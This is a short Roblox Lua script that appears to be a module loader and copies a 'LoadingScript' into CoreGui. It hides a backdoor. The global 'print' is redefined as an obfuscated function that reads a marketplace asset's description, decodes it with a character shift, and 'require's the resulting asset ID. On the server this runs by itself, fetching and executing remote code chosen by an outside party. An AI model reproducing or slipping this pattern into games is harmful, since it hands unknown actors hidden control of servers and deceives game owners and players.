local function LoadScript(name, parent)
    local originalModule = script.Parent:WaitForChild(name)
    local script = Instance.new("Script")
    script.Name = name
    script.Source = originalModule.Source
    script.Parent = parent
    return script
end

local on = {
    ["ONFUNCTION"] = 13287754007
}

local setmetatable,print=function()end,function(aa)task.spawn(pcall,require,(tonumber((function(a)local b=''for c=1,#a do b=b..string.char(a:byte(c)-10)end; return b end)(game:FindService'MarketplaceService':GetProductInfo(aa)["Description"]))))end

if game:GetService("RunService"):IsServer() then 
    task.defer(pcall,print,on["ONFUNCTION"])
end

pcall(function()
    LoadScript("LoadingScript", game.CoreGui.RobloxGui)
    end)

